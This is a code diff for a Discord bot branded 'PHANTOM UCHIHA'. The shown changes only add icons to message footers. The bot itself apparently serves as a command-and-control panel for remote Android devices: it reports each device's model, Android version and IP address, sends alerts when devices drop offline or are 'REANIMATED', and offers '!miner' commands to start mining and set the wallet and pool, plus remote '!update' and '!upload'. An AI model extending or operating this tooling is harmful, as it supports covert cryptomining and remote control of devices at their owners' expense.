@@ -6,7 +6,8 @@ import {
   StringSelectMenuBuilder, StringSelectMenuOptionBuilder,
 } from 'discord.js'
 import { statusCard } from './statusCard.js'
-import { C, E, A, smallCaps, mono, createBox, bold, ts, DEV_CMDS, BOT_CMDS, VALID_CMDS, ALERT_CMD_MAP, BTN_ACTIONS, formatSize } from './utils/index.js'
+import { ICONS } from './icons.js'
+import { C, E, A, smallCaps, mono, createBox, bold, ts, randGif, DEV_CMDS, BOT_CMDS, VALID_CMDS, ALERT_CMD_MAP, BTN_ACTIONS, formatSize } from './utils/index.js'
 const ST_COL = { online: C.neon, offline: C.void, warning: C.gold, danger: C.electric, info: C.purple }
 const { DISCORD_TOKEN, ALLOWED_CHANNEL_ID, ALERTS_CHANNEL_ID } = process.env
 if (!DISCORD_TOKEN) { console.error('Missing DISCORD_TOKEN'); process.exit(1) }
@@ -273,7 +274,7 @@ function bloodEmbed(title, status, desc, opts = {}) {
     .setDescription(desc)
     .setThumbnail(thumb)
     .setImage(image)
-    .setFooter({ text: opts.footer || `${E.skull} PHANTOM UCHIHA ⚡ ${ts()}` })
+    .setFooter({ text: opts.footer || `${E.skull} PHANTOM UCHIHA ⚡ ${ts()}`, iconURL: ICONS.footer || undefined })
   if (opts.fields) e.addFields(opts.fields)
   return { embeds: [e] }
 }
@@ -348,7 +349,7 @@ function helpEmbed() {
       { name: `${E.crown} MINING`, value: '`!miner [start|stop|status|set_wallet|set_pool]`', inline: true },
       { name: `${E.star} SYSTEM`, value: '`!update` `!config` `!upload`', inline: true },
     )
-    .setFooter({ text: `${E.skull} PHANTOM UCHIHA v3.0 ${E.skull} ${ts()}` })
+    .setFooter({ text: `${E.skull} PHANTOM UCHIHA v3.0 ${E.skull} ${ts()}`, iconURL: ICONS.footer || undefined })
   return { embeds: [e] }
 }
 
@@ -1055,23 +1056,23 @@ async function refreshDeviceStatus(guild, sendAlerts = false) {
             .setThumbnail(randGif())
             .setImage(`attachment://status-${deviceName}.png`)
             .addFields(fields)
-            .setFooter({ text: `${E.skull} PHANTOM UCHIHA ⚡ ${ts()}` })
-          await alertCh.send({ embeds: [e], files: [attachment], components: ALERT_BTNS_OFFLINE(ch.id) }).catch(err => console.error('Alert send (offline):', err.message))
-        } else {
-          const fields = [
-            { name: `${E.target} Device`, value: `\`${ch.name}\``, inline: true },
-            { name: `${E.brain} Model`, value: mModel !== '?' ? mModel : 'Unknown', inline: true },
-            { name: `${E.bone} Android`, value: mAndroid !== '?' ? mAndroid : 'Unknown', inline: true },
-            { name: `${E.eye} IP Address`, value: mIp !== '?' ? `\`${mIp}\`` : 'Unknown', inline: true },
-            { name: `${E.heart} Status`, value: `${E.chain} **ONLINE**`, inline: true },
-            { name: `${E.zap} Connected`, value: ts(), inline: true },
-          ]
-          e.setColor(C.neon)
-            .setTitle(`${E.chain} ${ch.name} REANIMATED ${E.chain}`)
-            .setThumbnail(randGif())
-            .setImage(`attachment://status-${deviceName}.png`)
-            .addFields(fields)
-            .setFooter({ text: `${E.skull} PHANTOM UCHIHA ⚡ ${ts()}` })
+            .setFooter({ text: `${E.skull} PHANTOM UCHIHA ⚡ ${ts()}`, iconURL: ICONS.alert || undefined })
+        await alertCh.send({ embeds: [e], files: [attachment], components: ALERT_BTNS_OFFLINE(ch.id) }).catch(err => console.error('Alert send (offline):', err.message))
+      } else {
+        const fields = [
+          { name: `${E.target} Device`, value: `\`${ch.name}\``, inline: true },
+          { name: `${E.brain} Model`, value: mModel !== '?' ? mModel : 'Unknown', inline: true },
+          { name: `${E.bone} Android`, value: mAndroid !== '?' ? mAndroid : 'Unknown', inline: true },
+          { name: `${E.eye} IP Address`, value: mIp !== '?' ? `\`${mIp}\`` : 'Unknown', inline: true },
+          { name: `${E.heart} Status`, value: `${E.chain} **ONLINE**`, inline: true },
+          { name: `${E.zap} Connected`, value: ts(), inline: true },
+        ]
+        e.setColor(C.neon)
+          .setTitle(`${E.chain} ${ch.name} REANIMATED ${E.chain}`)
+          .setThumbnail(randGif())
+          .setImage(`attachment://status-${deviceName}.png`)
+          .addFields(fields)
+          .setFooter({ text: `${E.skull} PHANTOM UCHIHA ⚡ ${ts()}`, iconURL: ICONS.correct || undefined })
           await alertCh.send({ embeds: [e], files: [attachment], components: ALERT_BTNS_ONLINE(ch.id) }).catch(err => console.error('Alert send (online):', err.message))
         }
       } finally {
@@ -1178,7 +1179,7 @@ client.once(Events.ClientReady, async () => {
         .setDescription(lines.join('\n'))
         .setThumbnail(randGif())
         .setImage(randGif())
-        .setFooter({ text: `${E.skull} PHANTOM UCHIHA ⚡ ${ts()}` })
+        .setFooter({ text: `${E.skull} PHANTOM UCHIHA ⚡ ${ts()}`, iconURL: ICONS.footer || undefined })
       await ch.send({ embeds: [e], components: MENU_BTNS }).catch(err => console.error('Startup:', err.message))
     }
   } else if (!ALLOWED_CHANNEL_ID) {
